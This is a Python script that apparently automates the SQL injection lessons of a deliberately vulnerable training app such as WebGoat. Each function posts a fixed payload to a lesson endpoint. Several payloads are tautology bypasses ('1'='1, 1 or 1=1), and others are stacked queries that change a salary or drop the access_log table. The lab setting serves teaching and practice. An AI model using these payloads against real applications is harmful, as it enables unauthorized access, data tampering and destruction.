# coding:utf-8
from wg_auto.base import request_wrap


def sql2_test(q="select department from employees where first_name='Bob' and last_name='Franco'"):
    __url = '/SqlInjection/attack2'
    return request_wrap(method='post', url=__url, data={"query": q})


def sql3_test(q="update employees set department='Sales' where "
                "first_name='Tobi' and last_name='Barnett'"):
    __url = '/SqlInjection/attack3'
    return request_wrap(method='post', url=__url, data={"query": q})


def sql4_test(q='alter table employees add phone varchar(20)'):
    __url = '/SqlInjection/attack4'
    return request_wrap(method='post', url=__url, data={"query": q})


def sql5_test(q='grant alter table to UnauthorizedUser'):
    __url = '/SqlInjection/attack5'
    return request_wrap(method='post', url=__url, data={"query": q})


def sql9_test():
    __url = "/SqlInjection/assignment5a"
    data = {"account": "Smith'", "operator": "or", "injection": "'1'='1"}
    return request_wrap(method='post', url=__url, data=data)


def sql10_test():
    __url = "/SqlInjection/assignment5b"
    data = {"login_count": "1", "userid": "1 or 1=1"}
    return request_wrap(method='post', url=__url, data=data)


def sql11_test():
    __url = "/SqlInjection/attack8"
    data = {"name": "Smith", "auth_tan": "1' or '1'='1"}
    return request_wrap(method='post', url=__url, data=data)


def sql12_test():
    __url = "/SqlInjection/attack9"
    # data = {"name": "Smith", "auth_tan": "3SL99A' or '1'='1"}
    data = {"name": "Smith", "auth_tan": "1' or 1=1;update employees set salary = 90000 where last_name = 'Smith';--+"}
    return request_wrap(method='post', url=__url, data=data)


def sql13_test():
    __url = "/SqlInjection/attack10"
    data = {"action_string": "1' or 1=1;drop table access_log;--"}
    return request_wrap(method='post', url=__url, data=data)
